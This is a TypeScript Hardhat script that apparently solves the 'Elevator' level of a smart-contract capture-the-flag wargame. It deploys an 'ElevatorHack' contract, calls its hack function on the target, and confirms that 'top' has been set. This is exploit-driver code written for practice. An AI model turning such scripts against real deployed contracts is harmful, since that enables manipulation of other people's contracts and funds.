import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

async function elevatorExploit() {
  const elevatorAddress = process.env.ELEVATOR_ADDRESS || fail("ELEVATOR_ADDRESS Not Found In .env");
  const elevator = await ethers.getContractAt("Elevator", elevatorAddress);
  const [attacker] = await ethers.getSigners();
  const ElevatorHack = await ethers.getContractFactory("ElevatorHack");

  const elevatorHack = await ElevatorHack.connect(attacker).deploy();
  await elevatorHack.deployed();

  console.log("Performing the hack...");

  const tx = await elevatorHack.hack(elevator.address);
  if (ethers.providers.getNetwork.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait(1);

  console.log(`'top' set to : '${await elevator.top()}'`);
  console.log(`SUCCESS!!! Submit the instance.`);
}

elevatorExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
